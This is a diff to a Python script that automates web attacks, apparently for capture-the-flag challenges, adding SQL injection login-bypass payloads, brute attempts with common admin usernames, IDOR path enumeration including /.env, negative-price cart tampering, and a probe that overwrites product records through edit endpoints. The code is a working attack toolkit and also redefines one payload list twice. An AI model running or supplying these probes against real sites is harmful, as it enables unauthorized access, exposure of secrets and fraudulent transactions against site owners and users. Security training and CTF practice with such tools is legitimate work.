@@ -32,15 +32,23 @@ def request(url, method="GET", data=None, cookies=None, headers=None, follow=Tru
 SQLI_PAYLOADS = [
     ("username", "' OR '1'='1", "x", "Boolean OR"),
     ("username", "admin'--", "x", "Comment bypass"),
-    ("username", "' UNION SELECT 1,2,3--", "x", "UNION probe"),
-    ("password", "' OR 1=1--", "", "Pass field inject"),
-    ("username+password", "'='", "'='", "Tautology"),
+    ("username", "'='", "'='", "Tautology"),
+    ("password", "' OR 1=1--", "", "Pass inject 1"),
+    ("password", "'='", "", "Pass inject 2"),
+    ("username", "' UNION SELECT 1,'admin','flag'--", "x", "UNION"),
 ]
 
 IDOR_PATHS = [
-    "/edit", "/edit/0", "/edit/1", "/edit/2",
-    "/view/1", "/view/2", "/user/1", "/profile/1",
-    "/admin", "/flag", "/debug", "/api", "/.env",
+    "/edit?id=0", "/edit?id=1", "/edit?id=2", "/edit?id=3", "/edit?id=-1",
+    "/edit/0", "/edit/1", "/edit/2",
+    "/view?id=1", "/view?id=2",
+    "/flag", "/admin", "/secret", "/debug", "/api", "/.env",
+]
+
+CART_PAYLOADS = [
+    '[]',
+    '[{"name":"x","price":-99999,"qty":1}]',
+    '[[0,{"name":"x","price":-99999,"qty":1}]]',
 ]
 
 CART_PAYLOADS = [
@@ -50,6 +58,18 @@ CART_PAYLOADS = [
 ]
 
 def probe_sqli(base_url, login_path="/login"):
+    # First: try password field injection with a known username
+    valid_users = ["admin", "administrator", "root", "user"]
+    for pw_payload in ["' OR '1'='1", "' OR 1=1--", "'--", "'='"]:
+        for v_user in valid_users:
+            data = {"username": v_user, "password": pw_payload}
+            code, body, _ = request(base_url + login_path, "POST", data=data)
+            if code == 200 and "Invalid" not in body:
+                flags = re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$", body)
+                if flags:
+                    return {"type": "SQLi/Flag", "found": True, "user": v_user, "pw": pw_payload, "flag": flags[0]}
+                return {"type": "SQLi", "found": True, "user": v_user, "pw": pw_payload, "status": code}
+    # Then: username injection
     for field, val1, val2, label in SQLI_PAYLOADS:
         if "+" in field:
             f1, f2 = field.split("+")
@@ -57,7 +77,7 @@ def probe_sqli(base_url, login_path="/login"):
         else:
             data = {field: val1, "password" if field=="username" else "username": val2}
         code, body, _ = request(base_url + login_path, "POST", data=data)
-        if code == 200 and "Invalid" not in body and "error" not in body.lower()[:200]:
+        if code == 200 and "Invalid" not in body:
             return {"type": "SQLi", "found": True, "field": field, "payload": f"{val1}+{val2}", "status": code}
 
 def probe_idor(base_url):
@@ -70,6 +90,22 @@ def probe_idor(base_url):
                 return {"type": "IDOR/Flag", "found": True, "path": path, "flag": flags[0]}
             if "flag" in body.lower() or "admin" in body.lower()[:300]:
                 return {"type": "IDOR", "found": True, "path": path, "status": code, "preview": body[:200]}
+
+def probe_edit_save(base_url):
+    """编辑产品保存——可能返回flag"""
+    for pid in [0, 1, 2]:
+        edit_url = f"{base_url.rstrip('/')}/edit?id={pid}"
+        code, body, _ = request(edit_url)
+        if code == 200 and len(body) > 300:
+            flags = re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$", body)
+            if flags:
+                return {"type": "EditPage", "found": True, "pid": pid, "flag": flags[0]}
+            # Now save with modified values
+            save_data = {"name": "probe", "desc": "x", "price": "0", "id": str(pid)}
+            code2, body2, _ = request(edit_url, "POST", data=save_data)
+            flags2 = re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$", body2)
+            if flags2:
+                return {"type": "EditSave/Flag", "found": True, "pid": pid, "flag": flags2[0]}
 
 def probe_cart(base_url, cart_path="/checkout", cart_param="cart"):
     for payload in CART_PAYLOADS:
@@ -90,7 +126,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
     results = []
-    for probe in [probe_sqli, probe_idor, probe_cart]:
+    for probe in [probe_sqli, probe_idor, probe_edit_save, probe_cart]:
         try:
             r = probe(target)
             if r:
